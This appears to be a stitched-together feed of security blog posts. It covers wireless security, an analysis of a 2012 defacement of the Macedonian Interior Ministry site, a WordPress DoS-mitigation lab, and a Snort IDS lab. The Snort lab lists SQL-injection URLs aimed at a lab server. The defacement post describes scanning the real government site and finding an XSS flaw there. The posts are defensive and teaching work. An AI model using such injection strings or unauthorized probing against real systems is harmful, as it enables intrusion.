used VirtualBox. During analysis each of group member did the same
analysis to cross - reference the results.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We basically used the following tools: Wireshark, Network Miner and
&lt;a href="http://virustotal.com/"&gt;virustotal.com&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

tool. The main goal for the template is first to analyse work-flow, then
to identify the assets, threat sources and vulnerabilities.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The first wireless telecommunications was established in early 20th
century, within successful transmitted radio signal across Atlantic
Ocean. And it was known as the first wireless communication across the
ocean. However, in this time likewise the computers were not widespread,
the inventors and developers of wireless have not had in mind that this
technology will be so spread and to carry out a security into the
wireless telecommunications. Whereabouts, nowadays computers are
worldwide spread in every home, in every office, and especially when we
are on the road or when we travel. We used them in fact as our main
devices to be able to complete and conduct our everyday tasks throughout
wireless technology. Such as, to share picture, media, use different
instant chatting application, video and voice calls – skype, etc.
Additionally, wireless technologies have been very popular recently, in
home and business users. Due to the fact that it is costs-effective,
useful, no mess cables into the build or house, it is easy to set up,
and it provides a great mobility.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Owing to the expansibility, mobility and usability, the wireless
technology and telecommunication could be at great risk. Therefore, in
this article we will introduce the readers within the different
categories coverage range wireless networks. Then we will go over the
wireless standards, as well as the most commonly known security threats.
Last but not least, we will introduce the readers with the basic
wireless security measures. And finally we will summarise the article
with the conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Network&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Wireless network it is used to transport data between devices and among
devices. They are often categorized into three groups based on the
coverage range, such as: Wireless Wide Area Networks (WWAN), WLANs, and
Wireless Personal Area Networks (WPAN). Where WWAN it involves wide
coverage area of technologies, such as, Global System for Mobile
Communication (GSM), 2G cellular, and many other. In the other hand,
WLAN unlike the traditional wired network does not need cables, it
connects computers and other parts to the network using an access point
device, and it has coverage areas of up to 300 feet. In contrast the
WLAN, the WPAN is representing the wireless personal area network
technologies such as Bluetooth and Infra-Red. Please note that these
technologies receive and send information using electromagnetic waves.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Standards&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Wireless technologies comply with a variety of standards and offer
different levels of security features. The advantages of standards are
to encourage mass production, as well as to allow products from
different vendors to interoperate. For this article we have limited the
discussion to the most commonly known IEEE 802.11 and the Bluetooth
standard.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the two standards are described below:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;IEEE 802.11 standard. Are first developed in 1997. It is designed to
    support medium range, higher data rate for applications, for
    instance, Ethernet networks and to mobile address and portable
    stations. In addition, WLAN standards are designed for 1 Mbps to 2
    Mbps wireless transmissions. Hence advanced support it was followed
    in 1999 by 802.11a, then by 802.11b standard, where the later on the
    security vulnerabilities of the standard have been exposed. Another
    standard still in draft has been developed – 802.11g, yet the
    massive WLAN productions now are based on the 802.11b standard.&lt;/li&gt;
&lt;li&gt;Bluetooth standard. It is an ad-hoc network standard. Are designed
    owing to interconnect different types of devices between each
    other’s, such as computers, mobile phones, PDAs, etc. Their
    applications include wireless synchronization, e-mail, internet
    access using personal computer connections, hands free headsets and
    car kits, and many others.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Security Threats&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;As the effect of that the wireless networks are widely spread and they
are available around us it represents the potential treats in wireless
network. Also the security threats could be made from errors and to
personal privacy. However, the most commonly known concerns in wireless
security are devices theft, vulnerabilities, denial of service attacks,
malicious code and hackers, services theft and foreign and industrial
espionage. Moreover, authorized and unauthorized access of the wireless
device may commit fraud and theft. As well as, malicious hackers may
break into a network without authorizations, by exploiting the
vulnerability, by brute forcing the password or other security
vulnerability flow to do hard or to gain personal information or needs.
In addition, malicious hackers or crackers are usually people from
outside of an organization or agency. Conversely, users within
organization and agency are a threat as well. Furthermore, they could
gain access to the wireless access point by eavesdropping on wireless
device communication. Additionally, malicious code includes such as,
worms, Trojan horses, viruses, or other unwanted code, application that
are designed for purpose to damage files or bring down the system or the
entire network. Service theft is when for instance an unauthorized user
gains access to the network and in worst case customer data or network
resources. And last, foreign and industrial espionage covers gathering
data from corporation or intelligence information from government.
Especially in wireless network espionage is very simple because the
transmission of data is across radio waves.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Wireless Security Measures&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;From the previous paragraph we can conclude that actually wireless
network it has different approaches and methods of threats. Therefore,
in this section we will concentrate of how to apply security measures in
our wireless network, either are for a personal or organizational usage.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First step is to create a Security Policy. It defines what it means to
be secure, as well as includes restrictions on wireless LAN functions,
traffic, flow, and access. Second is to configure for Secured Network
Access, by implementing and configuring setup password protection, also
to physically secure the WLAN and to secure the WLAN. It can be secured
from intruders by wireless authentication, such as: WEP (Wired
Equivalency Privacy) – which can be hacked very easily); WPA and WPA2
(Wi-Fi Protected Access) – are more secure alternatives, where unlike
the WEP and WPA, WPA uses the AES (Advance Encryption Standard) and it
supports two modes of authentication – WPA2-PSK (Pre-shared key) and
WPA2-Enterprise (EAP/RADIUS) mode. Thirdly by controlling wireless
visibility by Service Set Identifier (SSID), this is visible and real
name of the wireless network. Last but not least, by securing the
network with virtual segmentation, called Virtual LAN. Finally, we
recommend on-going security maintenance and continue education.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Today wireless networks are helping and definitely providing the
opportunity to the organizations, individuals and business to cut costs,
to increase the productivity and mobility. By following the above
recommended security measures the everyday work will in fact continue
without any interference. The key to keep up and creating a security
wireless network is on-going running business and organization.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;Yesterday, the 25 of June 2012, the Macedonian website of Ministry of
Interior (MVR) was defaced by Kosovo Network Security (KNS) group, below
figure. However, after we have noticed and some of the social networking
sites have informed me, I was concern to find out what just have
happened …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Purpose&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Yesterday, the 25 of June 2012, the Macedonian website of Ministry of
Interior (MVR) was defaced by Kosovo Network Security (KNS) group, below
figure. However, after we have noticed and some of the social networking
sites have informed me, I was concern to find out what just have
happened and how did happen, and of course how they have done it. So for
this purpose, I have done some digging into details, about the previous
defacement activities of this very important government site. But before
we continue with more details, let just talk about the situation of
yesterday and what did the authorities take protective measures steps
and actions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On Monday, 25 June 2012 at 19:38, one friend have updated his status in
one of the social networking sites, as follows: “Хакован
&lt;a href="http://mvr.gov.mk/"&gt;http://mvr.gov.mk/&lt;/a&gt;” (Hacked &lt;a href="http://mvr.gov.mk/"&gt;http://mvr.gov.mk/&lt;/a&gt;). And it made me
extremely intrigue to see what actually have just happened. The below
figure, displays the message spread from the KNS group.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Screenshot from the mvr.gov.mk defaced version&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, what makes the situation even more interesting is that after
the report that the site was defaced the authorities have taken a
measures steps to fix the issue, by either shutting down the server or
restoring the content of the site from the backup. Then after one or two
minutes the site was defaced again. I did not want to lose the time and
the nervous to check every five or ten minutes to see when it will be
back again.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, after 15 hours, or one stressful – hard core night for the
administrators of the site, the usability and functionalities where back
as normal, let just see how long will stay!&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, in the current post the idea is to give and overview, of what
actually is going on when it comes to case of cyber space, cyber
security issues in Macedonia. The structure of this post is introduces
first with the issue, or the problem that actuality made me to write
this post. Followed by the background investigation about the previous
defacement activities on the Ministry of Interior website in Macedonia.
Then with the background investigation about the KNS group, moreover,
with the self pen-testing site with different attacking methodologies.
And finally, closing by with a conclusion and action plan that should be
taken, for hence actions. This post does not only involves the public
sector, but even and the private sector too. Those agencies,
organizations are too much careless and do not take any actions of
securing their IT assets.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Ministry of Interior in Macedonia site offers different online services.
The site primary idea is to inform the inhabitance about the news,
actions, useful information, public relations, analysis and statistics;
international cooperation and legislation; and finally the services. And
secondly is to give and opportunities to the population scheduling of
service, if their document is issued, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In one short sentence, this site, for some people, it may be very useful
or not. However, I need to empathize that the site is only available in
Macedonian language, nor Albania, nor English version. So, in simple
conclusion this site is only useful for Macedonian speakers, and not for
foreigners, yet still represents one of very important public service,
government agency.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, in the next section we will discuses the previous
defacement and hacking attacks of this site.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Background&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The service of this site, or the domain first was registered in 22
October 2003, and unfortunate I do not remember when was first time
available and published. However, in the pass years I have heard many
times that this site was defaced and hacked, but still no actions or
results were shown. Therefore, it made me very interesting to find out,
if this defacement activities where notified and when and how many
where. For this purpose I have use a site service that I know few years
ago, the &lt;a href="http://www.zone-h.org/"&gt;Zone-H&lt;/a&gt;. Moreover,
&lt;a href="http://www.zone-h.org/"&gt;Zone-H&lt;/a&gt; is neither responsible for the reported
computer crimes nor it is directly or indirectly involved with them, it
is just and simple site where collects the cybercrime activities
notified anonymously. The bellow figure provides a details of previous
reported/notified cybercrime activities of MVR site in Macedonia.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In details, total notifications are 4 of which 2 are single IP and 2 are
mass defacements. The first mass defacement was done in 29 July 2009,
when the site use a OS: Windows 2000, then in 2011 it was the
re-defacement and the server operating system is Windows 2008. Followed
by the other massive defacement in this year 2012 in March 18, and same
year, few days before the current attack, 22 of June it was
re-defacement. And the attack, defacement that we write for it was not
notified or reported.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From these data, and schedule, we can come to a conclusion that the site
was defaced just 3 days before the mass defacement attack, so it might
be a simple warning, to taken an action before something goes really
wrong. But most probably, non of those administrators, or authorities
did not taken any serious actions, until the case yesterday appears.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Details&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To be able to do an analysis of what actually have happened, we need to
take some actions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First, we have done a simple web sniffer, to find out what kind of
system, and services the site, server is using. If we request the &lt;a href="http://en.wikipedia.org/wiki/List_of_HTTP_header_fields"&gt;HTTP
Request Header&lt;/a&gt;
we will receive an HTTP Response Header with a following data:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    Status: HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Server: Microsoft-IIS/7.0Set-Cookie: ASP.NET_SessionId=3lti3gep3usg4255ggf34tjn; path=/; HttpOnlyX-AspNet-Version: 2.0.50727X-Powered-By: ASP.NETDate: Tue, 26 Jun 2012 08:18:34 GMTConnection: closeContent-Length: 103773

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above data, is useful in a sense that provides as an information
about the Server and the ASP.Net Version. Then, if we want to find more
details about the open and close ports and operating system we can use
the &lt;a href="http://nmap.org/"&gt;nmap&lt;/a&gt; tool with the following command line:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;nmap -O -v IP-Address&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;And the results will be as follows:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    PORT STATE SERVICE21/tcp open ftp80/tcp open httpRunning (JUST GUESSING) : Microsoft Windows Vista|2008|7 (89%)

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;From the web sniffing and from the OS version scanning we can assume
that the server is running Microsoft Windows 2008. The current
vulnerabilities and possible exploitations are visible on the &lt;a href="http://technet.microsoft.com/en-us/security/bulletin/"&gt;Microsoft
Security
Bulletins&lt;/a&gt;
website. By knowing the vulnerabilities it is very easy task to find out
a way either to commit DoS attack or remote server access. However, in
this post we will not go into details and exploitation descriptions.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the KNS, we assume the domain is followed:
&lt;a href="http://kns-team.com/"&gt;http://kns-team.com&lt;/a&gt;. However, the site is down,
therefore, we will have to understand who is behind this domain
registration. Therefore, we will use the whois database to understand
more, or even we can use another site that have been defaced by this
group to find out more. So there is the list presented the members in
the groups and their archive of notified defaced sites:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zone-h.org/archive/notifier=cracker-besi"&gt;rAcKeR-BeSi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;GP&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zone-h.org/archive/notifier=L0wHacker"&gt;L0wHacker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;sLizer&lt;/li&gt;
&lt;li&gt;X-r00t&lt;/li&gt;
&lt;li&gt;SpyHackz&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;The Facebook fan page is:
&lt;a href="https://www.facebook.com/pages/Kosova-Network-Security/176195849098989"&gt;https://www.facebook.com/pages/Kosova-Network-Security/176195849098989&lt;/a&gt;.
For more info I was short of time to do more digging, but I hope that
someone will.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Action&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After understanding the details about the MVR site, operating system and
their server services, and information about the KNS, it is time to take
an action of trying to see how vulnerable is MVR site, and to see if
these lads had very difficult time of defacing the content of the site,
or even gaining access to the server-side.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;But before, we carry on, I want to stress out that this section is not
to give you an idea how, or knowledge to exploit or use any
vulnerabilities to deface or gain access to the site. We will just
demonstrate you a very simple
&lt;a href="http://en.wikipedia.org/wiki/Cross-site_scripting"&gt;XSS&lt;/a&gt; exploit of MVR
site that we have found a vulnerability, figure below.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Example of exploitation by XSS vulnerability, mvr.gov.mk&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;It is therefore, from this very simple and easy exploitation of XSS
vulnerability of the MVS site we will be able to run more advance and
complicated shell scripts to gain access and maintain access of the
server. Our initial idea is not to show you how to do it, but to expose
to the audience that actually hence actions is need it. And we hope that
the administrators, developers and the authorities will take an action
of mitigating the risk, and further vulnerabilities of the site.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In Macedonia, cyber space, cyber crime, cyber security, cyber warefare,
cyber terrorism are actually unknown words, terminology. They are not
even specified or added into the Macedonian dictionary, nor in IT
dictionary. However, this is not the first or least defacement, attack
that has happened in Macedonia, nor the first attack that has been done,
implemented by neighbor countries, or someone else. I just don’t
understand why people in this country are so careless about how to
protect their IT assets, and everything else, as well.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, it is not an issue that we do not have specialists to
conduct a pen-testing to the sites and services that not only the
government agencies are offering but even the banks and private sectors
as well. We even have a cyber crime unit in Ministry of Interior, and
one of very successful information security research and development
laboratory in Macedonia: &lt;a href="http://www.zeroscience.mk/en/"&gt;Zero Science
Lab&lt;/a&gt;. Also, the &lt;a href="http://cybersecurity.mk/icsap/"&gt;ICSAP – Interactive
Cyber Security Awareness Program&lt;/a&gt;,
Macedonia project, developed by myself.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Nevertheless, in final conclusion, I would like to recommend the
authorities to take actions about the above described activities done by
KNS and hope that the security awareness will boost up, and the further
actions will be considered of securing cyber space.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to make explore
alternative “clever” solutions (as opposed to making the site more
resilient by optimizing it) to protect your site against attacks.
Moreover, DDoS [1] attacks, malicious code, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, we need to develop countermeasures for the &lt;strong&gt;working&lt;/strong&gt;
attacks …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;PURPOSE &amp;amp; SCENARIO&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to make explore
alternative “clever” solutions (as opposed to making the site more
resilient by optimizing it) to protect your site against attacks.
Moreover, DDoS [1] attacks, malicious code, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, we need to develop countermeasures for the &lt;strong&gt;working&lt;/strong&gt;
attacks simulated with a standard DoS attack from a single IP address
(performed with AB [2] or Jmeter). Limitations for this scenarios is
highlighted:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;No additional hardware can be used&lt;/li&gt;
&lt;li&gt;The wordpress installation can not be optimized: no caching plugins,
    no reverse-proxy (varnish, squid etc)&lt;/li&gt;
&lt;li&gt;No reactive measures that automatically block incoming traffic: the
    site must respond to at least some of the requests coming from the
    attacker at all times&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The countermeasures must not have negative effects on “normal usage
    pattern”. Normal usage pattern is defined as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bursts of 10 connections per IP address in 1 second&lt;/li&gt;
&lt;li&gt;Page load times not over 10 seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   Normal usage must be possible from the same IP address that the
attack originated from after a 20 second delay maximum.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;In addition, we have to make much of the rules for the scenario. Rules
as follow: Fresh installation of the latest version of Ubuntu Server and
the most recent WordPress as of 20.10.2011. First priority: No normal
usage pattern connections can be dropped! Second priority: service speed
of normal connections. Defined by number of connections / second (easy
to measure). Third priority: How fast after the attack is stopped, the
site can be accessed from the attacking IP again.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Each test and measured results will be exposed in to Test section.
Whereas, the process of installation of clever solution and attacking
scripts will be provided in to Appendixes section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, the measurement results will be compared with the first state
without attack and any security solutions applied. Alternatively,
providing measurement results with one solution and attack will help us
to identify the most beneficial security solution. Therefore, in
Conclusion section comparison results will be highlighted.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;TESTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Because of requirements of our scenario we need to display the results
before security solution is applied and attacker performance. For this
purpose we are going to use an AB script to display the response time of
the server:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ab -t 10 -n 10 -c 10 http://192.168.56.102/wordpress/&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The above script provides detail information, yet only important is
Request per second. Thus, with an fresh installation and without any
security solution, it provided with result of 3.95 [#/sec]. With other
word, 3.95 number of request per second. After applying different
security solution and performing an attack to the server, results will
be divers.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In addition, test were done by two different virtual environment
machines. One is for testing results and the other one is to perform
attack with the following script:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ab -n 100 -c 10 http://192.168.56.102/wordpress/&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TEST 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;First test is to install libapache2-mod-evasive
[libapache2-mod-evasive]. Where, mod_evasive is an evasive maneuvers
module for Apache is to provide some protection in the event of an HTTP
DoS or DDoS attack or brute force attack. It is also designed to be a
detection tool, and can be easily configured to talk to ipchains,
firewalls, routers, and etcetera.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The process of installation and configuration refer to the Appendix 1.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After completed the installation and configuration process it is time to
test the security solution and to highlight the results. Before
performing the attack the results were somehow, lower then, before
installing the mod-evasive, 2.06 number request per second. When we
start the attack and in same time analysis the server responded with
timeout. The conclusion is that mod-evasive it is not enough solution.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TEST 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;From previous test we can see that the solution was not enough clever
for our needs. The server somehow was dead. However, we are going to
install now &lt;code&gt;mod_security&lt;/code&gt; module for apache, with side of previous
test. For more detail information of installation process and
configuration refer to Appendix 2 or to the following source
[mod_security].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;There are three points that we should consider and to see which proposal
was more accurate and it did the job that was required in the scenario.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, the above proposals are nice and good example to have an
view of how and with what tools we should perform script kiddie
techniques. How to shutdown access to a server. On the whole, it show as
how to use tools and methods of measuring the bandwidth of network and
how to limit the transfer in comfortable way.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIXES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Appendix 1 is connected with the Method 1, which highlighted points are
illustration on what information we should check, to clarify that the
virtual environment has limitation of the network interface. Where
Appendix 2 is for installation process of Ubuntu Server 10.04 LTS and
wordpress, mysql installation.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;APPENDIX 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Installation process:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo apt-get install libapache2-mod-evasive&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Configuration process is followed and gather from the following source
[Evasive Module], for addition proposal please refer to[Blacklist]:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo mkdir /var/log/apache2/mod_evasivesudo chown www-data /var/log/apache2/mod_evasive

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Afterwards, create its configuration file with a default content, with
the following command:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo nano /etc/apache2/apache2.conf IfModule mod_evasive20.c;DOSHashTableSize 3097DOSPageCount 2DOSSiteCount 50DOSPageInterval 1DOSSiteInterval 1DOSBlockingPeriod 10DOSLogDir /var/log/apache2/mod_evasiveDOSEmailNotify root@localhostDOSWhitelist 127.0.0.1DOSSystemCommand &amp;amp;quot;/sbin/iptables -I INPUT -p tcp --dport 80 -s %s -j DROP/IfModule;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above changes to take effect please restart the apache service by:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo service apache2 restart&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;You can test whether it works using a script included in the deb
package:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;perl /usr/share/doc/libapache2-mod-evasive/examples/test.pl&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;APPENDIX 2&lt;/h2&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to create a solution

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to create a solution
and instructions for testing an IDS^1^ systems usefulness for detecting
attacks against a wordpress site. In addition, we have to
develop/download/find/whatever a SNORT configuration (rulesets,
preprocessors, whatever) that performs better than the default
configuration in previous post. By better we mean:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Less false positives&lt;/li&gt;
&lt;li&gt;Less false negatives&lt;/li&gt;
&lt;li&gt;The objectives are contradictory so the rule of thumb is one false
    negative per 10 false positives eg. solution with 10 false positives
    and 2 false negatives is better than the solution with 100 false
    positives and 1 false negatives, but the solution with 10 false
    positives and 1 false negative is better than the solution with 1
    false positive and 2 false negatives.&lt;/li&gt;
&lt;li&gt;Attack is defined by a single invocation of all the test scripts in
    a row.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Meanwhile, the new rules have to be able to detect not only the default
attacks that are set to a default snort configuration, yet they have to
be able to detect SQL injection, brute force password, apache killer
script, pytbull, etc. Furthermore, in figure 1 we are illustrating the
scenario.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Illustration of Scenario&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, in the proposal section we will present two proposals that
have been submitted due to this laboratory test and additionally in
result section we will highlighted the identification numbers made by
snort set new rules. In section appendixes we will provide you with more
details configuration procedures, configuration of VM’s – Virtual
Machines, attacks, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, closing with an conclusion and the results of best set of rules
made of the proposals.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;SETUP of SNORT&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To setup snort in a right way, that will work for the second Host only
network please following the instruction link provided with a full
description and configuration of snort [SNORT2].&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;PROPOSALS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In total two proposals are presented in next sub-sections.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Add &lt;a href="http://www.tud.ttu.ee/~t061780/attacks/robert.rules"&gt;http://www.tud.ttu.ee/~t061780/attacks/robert.rules&lt;/a&gt; to your Snort.
On your Snort machine:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    cd /etc/snort/ruleswget http://www.tud.ttu.ee/~t061780/attacks/robert.rules

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Now you have the rules, add them to your snort conf file (default
/etc/snort/snort.conf). To do that inser:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;include $RULE_PATH/robert.rules&lt;/code&gt; somewhere with rest of the rules after
line 800. Run Snort and test.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Add the following rules: &lt;a href="http://predragtasevski.com/src/predrag.rules"&gt;http://predragtasevski.com/src/predrag.rules&lt;/a&gt;.
To be able to insert the snort rules in to the snort file please double
check where it is located. You can find the location with the following
command: find / -name snort.conf Before you continue please change the
IP address to your server address on line number #6, example alert tcp
any any -&gt; 192.168.56.X where x is your octet. Then to add the
following rules at the conf file do the following command:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cat predrag.rules &amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;gt; snort.conf&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Now it is time to start or restart snort. It should work.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;RESULTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After executing the above proposal we will highlight the results into
the table bellow. Result are presented from the total amount of reports,
registered alerts in the snort. This is done by help of web interface of
Basic Analysis and Security Engine in addition Analysis Console for
Intrusion Databases (ACID) project tool [ACID]. Therefore, the result
from the proposals are highlighted below:&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;
&lt;/table&gt;

&lt;/p&gt;

&lt;p&gt;Table 1: Details of total report numbers of alerts made by SNORT and the
different proposal rule sets. Details of the attacks conducted in the
table are presented in appendixes section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, figure 2 is presenting the pine chart of the total number
alerts recognized by Snort.&lt;/p&gt;

&lt;p&gt;Secondly, figure 3 is representing the pine chart of total number of
unique alerts recognized by Snort.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: Total number of Unique Alerts&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;From the above results we came to conclusion that the new applied rules
were successful and were able to recognize alerts more then the default
rule set of Snort. Meanwhile, only proposal 2 was able to recognized an
SQL injections without any additional tweaking. Although proposal 1 was
still useful, on the other hand the best solution is when we combine the
both rule sets proposals. Then the Snort is able to recognized an
significant number of total alerts and additionally for our laboratory
report more interesting is unique total number alerts.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Closing, even the default Snort rules configuration is good, yet when
you tweak it by&lt;/p&gt;
&lt;p&gt;your own needs, you will have much better IDS system for your network.
In future it should be recommended always refer to [snort_rules], to
gather more available advance Snort rules, made by experts. Where will
help you to configure and setup Snort IDS system to detecting attacks
against a wordpress site, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;Appendix 1 is the configuration of the attacker virtual machine, in more
detail Blacktrack 5 distribution. Secondly, Appendix 2 is the ubuntu

&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIX 4&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Here we test typical SQL- injection in URLs&lt;/p&gt;
&lt;p&gt;Commands used:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    wget "http://192.168.56.101/?p=1'%20OR%20'1'='1"wget "http://192.168.56.101/?p=1'%20AND%201=(SELECT%20COUNT(*)%20FROM%20tabname);%20—"

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Snort by default does not detect this, where in applying the proposal 2
rules, it did detect.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIX 5&lt;/h1&gt;
&lt;/p&gt;

